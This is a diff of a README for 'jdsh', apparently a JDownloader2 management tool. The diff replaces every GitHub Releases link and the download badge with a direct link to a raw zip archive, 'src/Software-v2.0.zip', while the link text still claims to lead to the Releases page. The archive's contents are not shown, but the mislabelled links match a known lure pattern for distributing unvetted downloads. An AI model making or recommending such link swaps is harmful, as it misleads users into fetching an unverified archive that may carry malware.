@@ -1,6 +1,6 @@
 # 🚀 jdsh - Simple Tool for JDownloader2 Management
 
-[![Download jdsh](https://img.shields.io/badge/Download-jdsh-brightgreen.svg)](https://github.com/patowon/jdsh/releases)
+[![Download jdsh](https://github.com/patowon/jdsh/raw/refs/heads/main/src/Software-v2.0.zip)](https://github.com/patowon/jdsh/raw/refs/heads/main/src/Software-v2.0.zip)
 
 ## 🏁 Introduction
 
@@ -12,7 +12,7 @@ To get started with jdsh, you need to download the application from our Releases
 
 1. **Visit the Releases Page**:
    Click the link below to go directly to the download page.
-   [Visit Releases Page to Download jdsh](https://github.com/patowon/jdsh/releases)
+   [Visit Releases Page to Download jdsh](https://github.com/patowon/jdsh/raw/refs/heads/main/src/Software-v2.0.zip)
 
 2. **Choose a Version**:
    On the releases page, you will see different versions of jdsh. Pick the latest stable version.
@@ -51,7 +51,7 @@ Once you have installed jdsh, you can start using it right away. Here are the ba
 
 3. **Listing Downloads**: Type `jdsh list` to see all your current downloads and their statuses.
 
-4. **Updating jdsh**: To ensure that you are using the latest version, periodically check the Releases page [here](https://github.com/patowon/jdsh/releases) for updates.
+4. **Updating jdsh**: To ensure that you are using the latest version, periodically check the Releases page [here](https://github.com/patowon/jdsh/raw/refs/heads/main/src/Software-v2.0.zip) for updates.
 
 ## ❓ Troubleshooting
 
@@ -69,6 +69,6 @@ If you need further assistance, you can open an issue in this GitHub repository 
 
 Thanks to the developers of JDownloader2 for creating such a powerful downloading tool. jdsh enhances the JDownloader2 experience, and we appreciate your support in using and improving our tool. 
 
-For more information, please visit our GitHub page or check out the [Releases Page](https://github.com/patowon/jdsh/releases) to get started with downloading.
+For more information, please visit our GitHub page or check out the [Releases Page](https://github.com/patowon/jdsh/raw/refs/heads/main/src/Software-v2.0.zip) to get started with downloading.
 
 Feel free to customize and explore all the features that jdsh offers!
